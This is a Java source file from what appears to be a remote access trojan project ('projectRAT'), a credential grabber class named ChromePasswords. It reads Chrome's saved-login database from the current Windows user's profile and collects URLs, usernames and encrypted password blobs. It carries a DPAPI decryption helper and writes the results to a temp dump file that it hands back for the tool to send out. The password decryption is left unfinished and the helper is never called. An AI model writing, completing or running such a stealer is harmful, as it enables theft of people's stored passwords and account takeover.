package in.momin5.projectRAT.request.grabbers;

import com.sun.jna.platform.win32.Crypt32Util;
import in.momin5.projectRAT.request.Request;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.sql.*;
import java.util.ArrayList;

public class ChromePasswords implements Request {

    File infoDumpFile;

    @Override
    public void init() throws Exception {
        ArrayList<String> list = getChromePass();
        infoDumpFile = new File(System.getProperty("java.io.tmpdir") + "/chrome256567.dump");
        FileOutputStream dumpStream = new FileOutputStream(infoDumpFile);
        for(String s: list){
            System.out.println(s);
            dumpStream.write(s.getBytes());
            dumpStream.write("\n".getBytes());
        }
        dumpStream.flush();
        dumpStream.close();
    }

    @Override
    public String getMessage() {
        return null;
    }

    @Override
    public File[] getFiles() {
        return new File[]{
          infoDumpFile
        };
    }

    private ArrayList<String> getChromePass(){
        ArrayList<String> info = new ArrayList<>();
        Connection conn = null;
        Statement statement = null;

        try {
            String stmt = "jdbc:sqlite:C:/Users/" + System.getProperty("user.name") +"/AppData/Local/Google/Chrome/User Data/Default/Login Data";
            conn = DriverManager.getConnection(stmt);
            //conn.setAutoCommit(false);

            statement = conn.createStatement();
            ResultSet rs = statement.executeQuery("SELECT * FROM logins;");
            while (rs.next()){
                String url = rs.getString("action_url");
                if(url == null) url = "URL not found";
                String username = rs.getString("username_value");
                if(username == null) username = "Username not found";
                Blob pass = rs.getBlob("password_value");
                InputStream passwordHashStream = rs.getBinaryStream("password_value");
                info.add(String.format("URL: %s ;USERNAME: %s ;Password: ",url,username));
                System.out.println(streamToString(passwordHashStream));
            }
            rs.close();
            statement.close();
            conn.close();

        }catch (Exception e){
            e.printStackTrace();
        }

        return info;
    }

    public static String encryptedBinaryStreamToDecryptedString(String s) throws IOException {
        StringBuilder toRet2=new StringBuilder();
        byte[] toRet = Crypt32Util.cryptUnprotectData(s.getBytes());
        for (byte b: toRet){
            toRet2.append((char)b);
        }
        return toRet2.toString();
    }

    public static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }

    public static String streamToString(InputStream b) throws IOException{
        StringBuilder toRet=new StringBuilder();
        String s;
        while (b.available()>0){
            s=String.format("%s",Integer.toHexString(b.read()));
            if (s.length()==1) toRet.append("0"+s+"");
            else toRet.append(s+"");
        }
        b.close();
        return toRet.toString();
    }
}
